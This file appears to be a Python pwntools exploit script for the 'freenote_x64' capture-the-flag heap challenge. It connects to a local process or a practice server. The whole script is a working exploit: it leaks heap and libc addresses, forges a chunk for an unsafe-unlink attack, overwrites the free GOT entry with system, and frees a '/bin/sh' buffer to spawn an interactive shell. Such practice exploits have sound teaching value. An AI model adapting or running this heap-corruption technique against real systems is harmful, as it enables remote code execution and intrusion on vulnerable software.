#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/28 10:30:45
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('./freenote_x64')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 26000
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./freenote_x64')
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil("Your choice: ")
    sh.sendline(str(choice))

def show():
    cmd(1)

def add(size,content):
    cmd(2)
    sh.recvuntil("Length of new note: ")
    sh.sendline(str(size))
    sh.recvuntil("Enter your note: ")
    sh.send(content)

def edit(idx,size,content):
    cmd(3)
    sh.recvuntil("Note number: ")
    sh.sendline(str(idx))
    sh.recvuntil("Length of note: ")
    sh.sendline(str(size))
    sh.recvuntil("Enter your note: ")
    sh.send(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("Note number: ")
    sh.sendline(str(idx))

add(0x80,'a'*0x80)
add(0x80,'a'*0x80)
add(0x80,'a'*0x80)
add(0x80,'a'*0x80)
dele(0)
dele(2)
add(8,'a'*8)
add(1,'a')
show()
sh.recvuntil("0. aaaaaaaa")
heap_base = u64(sh.recv(4).ljust(8,"\x00")) - 0x1940
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b61
log.info("libc_base=>{}".format(hex(libc_base)))
log.info("heap_base=>{}".format(hex(heap_base)))
system = libc_base + libc.symbols['system']
dele(0)
dele(1)
dele(2)
dele(3)
payload = p64(0) + p64(0) + p64(heap_base+0x30-0x18) + p64(heap_base+0x30-0x10)
add(0x20,payload)
add(8,"/bin/sh\x00")
payload = 'a'*0x80 + p64(0x1a0) + p64(0x90) +  'a'*0x80 + p64(0) +  p64(0x21) + 'a'*0x24 + "\x01"
add(len(payload),payload)

dele(3)
debug()
payload = p64(2) + p64(1) + p64(8) + p64(elf.got['free'])
edit(0,0x20,payload)
edit(0,8,p64(system))
dele(1)
# payload = p64()
# debug()
sh.interactive()